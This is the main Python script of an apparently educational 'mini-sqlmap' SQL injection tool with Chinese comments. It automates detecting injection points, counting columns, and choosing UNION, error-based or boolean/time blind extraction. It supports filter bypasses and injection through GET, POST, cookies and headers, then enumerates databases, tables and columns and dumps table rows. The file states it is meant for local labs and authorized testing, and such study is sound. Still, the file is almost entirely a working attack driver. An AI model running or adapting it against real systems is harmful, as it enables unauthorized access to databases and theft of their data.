"""SQL 注入自动化工具（mini-sqlmap）— 入口。

完整流程（7 个阶段，括号里是对应模块，方便逐步理解）：
    1. 注入点探测          payloads/detectors.py
    2. 字段数探测          payloads/union.py   (ORDER BY)
    3. 回显位探测          payloads/union.py   (标记法) -> UNION / 报错 / 盲注
    4. 数据库基础信息      payloads/extractor.py
    5. 枚举所有数据库      payloads/extractor.py
    6. 枚举目标库的表      payloads/extractor.py
    7. 表结构 + 数据导出   payloads/extractor.py (+ payloads/blind.py 盲注备选)

用法（仅用于本地靶场 / 授权测试学习）：
    python main.py                                     # 按 config.py 默认目标跑全流程
    python main.py --url http://x/sql/Less-1/ --param id
    python main.py --db security --table users         # 指定库表并导出数据
    python main.py --db security --table users --limit 20
    python main.py --mode blind --blind bool           # 强制布尔盲注
    python main.py --mode blind --blind time --sleep 3 # 强制时间盲注
    python main.py --inject post --param uname         # 注入位换成 POST 表单
    python main.py --inject cookie --param uname       # 注入位换成 Cookie
    python main.py --bypass space                      # 强制用 /**/ 代替空格
"""
import argparse
import sys
import time

import requests
import urllib3

import config
from conditions import oracle as oracle_mod
from conditions.boolean import TruthDetector
from core.injector import Injector
from core.point import PointSpec
from history.recorder import Recorder
from payloads import blind, detectors, error_based, extractor, union
from payloads.extractor import ROW_SEP
from transport.http_client import HttpClient

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

TOTAL_STAGES = 7


# ---------- 打印辅助 ----------

def stage(n, title):
    print("\n" + "=" * 60)
    print(f"[*] 阶段 {n}/{TOTAL_STAGES}: {title}")
    print("=" * 60)


def ok(msg):
    print(f"[+] {msg}")


def info(msg):
    print(f"[*] {msg}")


def warn(msg):
    print(f"[!] {msg}")


def fail(msg):
    print(f"[-] {msg}")


def print_table(headers, rows):
    """按列宽对齐打印数据表。"""
    if not rows:
        print("    (无数据)")
        return
    widths = [max([len(str(h))] + [len(str(r[i])) for r in rows])
              for i, h in enumerate(headers)]
    line = "  ".join(str(h).ljust(w) for h, w in zip(headers, widths))
    print("    " + line)
    print("    " + "-" * len(line))
    for r in rows:
        print("    " + "  ".join(str(c).ljust(w) for c, w in zip(r, widths)))


# ---------- 组装 ----------

def parse_args():
    p = argparse.ArgumentParser(
        description="SQL 注入自动化工具（mini-sqlmap，仅用于本地靶场/授权测试学习）")
    p.add_argument("--url", default=config.TARGET_URL, help="目标 URL（默认取 config.py）")
    p.add_argument("--param", default=config.PARAM_NAME, help="注入参数名")
    p.add_argument("--db", help="目标数据库（默认：当前数据库）")
    p.add_argument("--table", help="要导出的表（指定后进入阶段 7 导出数据）")
    p.add_argument("--limit", type=int, default=config.DUMP_LIMIT,
                   help=f"导出行数（默认 {config.DUMP_LIMIT}）")
    p.add_argument("--timeout", type=float, default=config.TIMEOUT, help="单请求超时秒数")
    p.add_argument("--max-columns", type=int, default=config.MAX_COLUMNS,
                   help="ORDER BY 探测字段数上限")
    p.add_argument("--inject", choices=["get", "post", "cookie", "header"],
                   default=config.INJECT_MODE,
                   help="注入位：GET 参数 / POST 表单 / Cookie / 请求头")
    p.add_argument("--mode", choices=["auto", "union", "error", "blind"], default="auto",
                   help="强制注入模式（默认 auto：UNION > 报错 > 盲注）")
    p.add_argument("--blind", choices=["auto", "bool", "time"], default=config.BLIND_TYPE,
                   help="盲注手段：auto 先布尔后时间")
    p.add_argument("--bypass", choices=["auto", "plain", "space", "and", "keyword", "comma"],
                   default=config.BYPASS_MODE, help="语法变体：auto 自动探测过滤规则")
    p.add_argument("--sleep", type=float, default=config.BLIND_SLEEP,
                   help="时间盲注的 sleep 秒数")
    return p.parse_args()


def make_extract(injector, mode, positions, ncolumns, oracle, error_build=None):
    """统一的取数入口：UNION / 报错走回显（快），否则走盲注（慢但通用）。"""
    if mode == "union":
        def extract(select_sql, stage="extract"):
            # 依次尝试每个回显位，哪个提出数据用哪个
            for pos in positions:
                value = union.extract_union(injector, pos, ncolumns, select_sql, stage)
                if value is not None:
                    return value
            warn("所有回显位都没有提取到数据")
            return None
    elif mode == "error":
        def extract(select_sql, stage="extract"):
            return error_based.extract_error(injector, error_build, select_sql,
                                             max_len=config.BLIND_MAX_LEN, stage=stage)
    else:
        def extract(select_sql, stage="extract"):
            return blind.blind_value(oracle, select_sql,
                                     max_len=config.BLIND_MAX_LEN, progress=True)
    return extract


# ---------- 主流程 ----------

def main():
    args = parse_args()
    client = HttpClient(timeout=args.timeout)
    recorder = Recorder()
    point = PointSpec(args.inject, args.param).build()
    injector = Injector(
        client=client, recorder=recorder,
        url=args.url, param=args.param,
        prefix=config.PREFIX, union_prefix=config.UNION_PREFIX,
        suffix=config.SUFFIX, transforms=config.TRANSFORMS,
        point=point,
    )

    info(f"目标: {args.url}")
    info(f"注入位: {args.inject}:{args.param}    闭合: {config.PREFIX}    注释: {config.SUFFIX}")
    started = time.time()

    # ========== 阶段 1：注入点探测 ==========
    stage(1, "注入点探测")
    try:
        has_error, _ = detectors.detect_error(injector)
        boolean_ok, bool_info = detectors.detect_boolean(injector)
    except requests.exceptions.RequestException as e:
        fail(f"目标不可达: {e}")
        fail("请确认靶机已启动、IP 正确（改 config.py 的 TARGET_URL）")
        sys.exit(1)

    if has_error:
        ok("报错探测: 响应包含 SQL 报错 -> 存在注入")
    else:
        info("报错探测: 未发现 SQL 报错")
    if boolean_ok:
        ok(f"布尔探测: and 1=1 / and 1=2 页面差异明显 "
           f"(正常 vs 假: {bool_info['normal_vs_false']:.3f})")
    else:
        info("布尔探测: 页面无差异")
    if not has_error and not boolean_ok:
        warn("常规探测无信号：可能页面无回显、and 被过滤，或只能时间盲注，继续尝试")

    truth = None
    if boolean_ok:
        truth = TruthDetector(injector)
        if not truth.reliable:
            warn("布尔基准页差异过小，盲注结果可能不可靠")

    # ========== 阶段 2：字段数 ==========
    stage(2, "字段数探测 (ORDER BY)")
    ncolumns = None
    if has_error or (truth is not None and truth.reliable):
        # 有报错回显就用报错判断，没有就用布尔判断
        ncolumns = union.find_column_count(
            injector, max_columns=args.max_columns,
            truth=truth if not has_error else None)
        if ncolumns is None:
            warn(f"ORDER BY 到 {args.max_columns} 仍无法确定字段数，跳过 UNION 方案")
        else:
            ok(f"字段数 = {ncolumns}")
    else:
        warn("无报错回显且布尔无信号，跳过字段数探测（盲注模式不需要字段数）")

    # ========== 阶段 3：选择注入模式 ==========
    stage(3, "回显位探测 / 选择注入模式")
    positions = []
    if ncolumns and args.mode in ("auto", "union"):
        positions, _ = union.find_display_positions(injector, ncolumns)

    error_build = None
    oracle_obj = None

    if args.mode == "union" or (args.mode == "auto" and positions):
        if not positions:
            fail("强制 UNION 模式，但没有找到可用回显位")
            sys.exit(1)
        mode = "union"
        ok(f"回显位: {positions} -> UNION 回显模式（1 次请求拿全量）")
    elif args.mode in ("auto", "error"):
        # UNION 不显示结果时，先看报错能不能带出数据（比盲注快几十倍）
        error_name, probe_value = error_based.detect(injector)
        if error_name:
            mode = "error"
            error_build = error_based.BUILDERS[error_name]
            ok(f"报错回显可用（{error_name}，试读: {probe_value}）-> 报错注入模式（快）")
        elif args.mode == "error":
            fail("强制报错模式，但报错里取不到数据")
            sys.exit(1)
        else:
            mode = "blind"
    else:
        mode = "blind"

    if mode == "blind":
        if args.blind in ("auto", "bool"):
            dialect, oracle_obj = oracle_mod.probe_dialect(injector, args.bypass)
            if oracle_obj:
                ok(f"布尔盲注可用（语法变体: {dialect.label}，约 7 次/字符）")
            else:
                info("布尔盲注无信号")
        if oracle_obj is None and args.blind in ("auto", "time"):
            warn(f"改用时间盲注（每猜一个真条件要等 {args.sleep}s，会很慢）")
            dialect, oracle_obj = oracle_mod.probe_time_dialect(
                injector, args.bypass, args.sleep)
            if oracle_obj:
                ok(f"时间盲注可用（语法变体: {dialect.label}）")
        if oracle_obj is None:
            fail("布尔与时间盲注都不可用。检查闭合方式、注入位或该关的过滤规则")
            sys.exit(1)

    extract = make_extract(injector, mode, positions, ncolumns, oracle_obj, error_build)

    # ========== 阶段 4：基础信息 ==========
    stage(4, "数据库基础信息")
    version_ = extract(extractor.sql_version(), stage="info_version") or "?"
    current_db = extract(extractor.sql_current_db(), stage="info_db") or "?"
    current_user = extract(extractor.sql_current_user(), stage="info_user") or "?"
    ok(f"版本  : {version_}")
    ok(f"数据库: {current_db}")
    ok(f"用户  : {current_user}")

    # ========== 阶段 5：枚举数据库 ==========
    stage(5, "枚举所有数据库")
    dbs_raw = extract(extractor.sql_databases(), stage="enum_dbs") or ""
    databases = [d for d in dbs_raw.split(",") if d]
    ok(f"共 {len(databases)} 个: {', '.join(databases)}")

    # ========== 阶段 6：枚举数据表 ==========
    stage(6, "枚举数据表")
    db = args.db or current_db
    if db == "?":
        db = databases[0] if databases else "?"
        warn(f"当前库提取失败，改用第一个库: {db}")
    tables_raw = extract(extractor.sql_tables(db), stage="enum_tables") or ""
    tables = [t for t in tables_raw.split(",") if t]
    info(f"目标库: {db}")
    ok(f"共 {len(tables)} 张表: {', '.join(tables)}")

    # ========== 阶段 7：表结构与数据导出 ==========
    stage(7, "表结构与数据导出")
    if not args.table:
        info(f"未指定 --table，跳过导出。示例: python main.py --db {db} --table users")
    else:
        table = args.table
        cols_raw = extract(extractor.sql_columns(db, table), stage="enum_columns") or ""
        columns = [c for c in cols_raw.split(",") if c]
        if not columns:
            warn(f"未取到 {db}.{table} 的字段，可能表名有误")
        else:
            ok(f"表 {db}.{table} 的字段: {', '.join(columns)}")

            if mode == "blind":
                warn("盲注模式导出较慢，行数多时请耐心等待或减小 --limit")
            dump_raw = extract(extractor.sql_dump(db, table, columns, limit=args.limit),
                               stage="dump") or ""
            raw_rows = [r.split("|", len(columns) - 1) for r in dump_raw.split(ROW_SEP) if r]
            # 补齐/对齐每行单元格数
            rows = [(cells + [""] * len(columns))[:len(columns)] for cells in raw_rows]
            print()
            print_table(columns, rows)
            print()
            ok(f"导出 {len(rows)} 行 (limit={args.limit})")

    # ========== 汇总 ==========
    print("\n" + "=" * 60)
    s = recorder.stats()
    info(f"请求总数: {s['total']}  成功: {s['ok']}  "
         f"平均耗时: {s['avg_ms']:.1f} ms  总耗时: {time.time() - started:.1f} s")
    info(f"各阶段请求数: {s['stages']}")
    info(f"完整请求历史: {recorder.path}")
    print("=" * 60)
    print("[学习地图] 阶段 -> 模块对应关系：")
    print("  注入探测 -> payloads/detectors.py        字段数/回显位 -> payloads/union.py")
    print("  SQL 构造 -> payloads/extractor.py        盲注猜解 -> payloads/blind.py")
    print("  报错提取 -> payloads/error_based.py      盲注提问 -> conditions/oracle.py")
    print("  注入位置 -> core/point.py                语法变体 -> bypass/syntax.py")
    print("  请求封装 -> core/injector.py             请求历史 -> history/recorder.py")
    print("  绕过规则 -> bypass/ + core/pipeline.py   HTTP 底层 -> transport/http_client.py")


if __name__ == "__main__":
    main()
